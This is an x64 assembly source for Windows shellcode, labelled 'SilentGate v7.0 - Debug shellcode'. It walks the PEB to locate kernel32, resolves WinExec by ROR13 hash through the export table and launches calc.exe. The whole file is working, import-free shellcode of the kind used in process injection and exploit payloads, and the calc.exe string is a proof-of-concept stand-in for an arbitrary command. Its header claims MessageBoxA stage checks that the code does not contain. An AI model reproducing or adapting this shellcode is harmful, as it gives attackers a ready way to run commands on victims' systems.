; SilentGate v7.0 - Debug shellcode
; Tests PEB walk step by step
; Calls MessageBoxA to confirm each stage works
BITS 64

_start:
    push rbp
    mov rbp, rsp
    push rsi
    push rdi
    push rbx
    push r12
    push r13
    push r14
    push r15
    and rsp, 0xFFFFFFFFFFFFFFF0
    sub rsp, 0x100

    ; Find kernel32
    ; Module order: [0]=our EXE [1]=ntdll [2]=kernel32
    ; Need 3 flinks from InMemoryOrderModuleList
    xor rbx, rbx
    mov rbx, [gs:rbx+0x60]    ; PEB
    mov rbx, [rbx+0x18]       ; Ldr
    mov rbx, [rbx+0x20]       ; InMemoryOrderModuleList (head)
    mov rbx, [rbx]            ; flink -> our EXE (index 0)
    mov rbx, [rbx]            ; flink -> ntdll (index 1)
    mov rbx, [rbx]            ; flink -> kernel32 (index 2)
    mov rbx, [rbx+0x20]       ; DllBase = kernel32 base (offset 0x30 from InMemoryOrderLinks)
    ; rbx = kernel32 base
    mov r15, rbx

    ; Find WinExec via export table walk
    ; WinExec ROR13 hash = 0x0E8AFE98
    mov edx, [rbx+0x3C]
    add rdx, rbx               ; PE header
    mov edx, [rdx+0x88]
    add rdx, rbx               ; export dir

    mov r8d,  [rdx+0x18]       ; NumberOfNames
    mov r10d, [rdx+0x20]
    add r10, rbx               ; names VA
    mov r11d, [rdx+0x24]
    add r11, rbx               ; ordinals VA
    mov r12d, [rdx+0x1C]
    add r12, rbx               ; functions VA

    xor rcx, rcx
.search:
    mov esi, [r10+rcx*4]
    add rsi, rbx               ; name string

    ; Hash this name
    xor eax, eax
.hash:
    movzx edi, byte [rsi]
    test edi, edi
    jz .check
    ror eax, 13
    add eax, edi
    inc rsi
    jmp .hash
.check:
    cmp eax, 0x0E8AFE98        ; WinExec hash
    je .found
    inc rcx
    cmp ecx, r8d
    jl .search
    jmp .done

.found:
    movzx eax, word [r11+rcx*2]
    mov eax, [r12+rax*4]
    add rax, rbx               ; WinExec VA
    mov r13, rax

    ; Call WinExec("calc.exe", SW_SHOW)
    call .get_str
    db "calc.exe", 0
.get_str:
    pop rcx
    sub rsp, 0x28
    mov rdx, 1                 ; SW_SHOW
    call r13
    add rsp, 0x28

.done:
    lea rsp, [rbp-0x38]
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    pop rdi
    pop rsi
    pop rbp
    ret
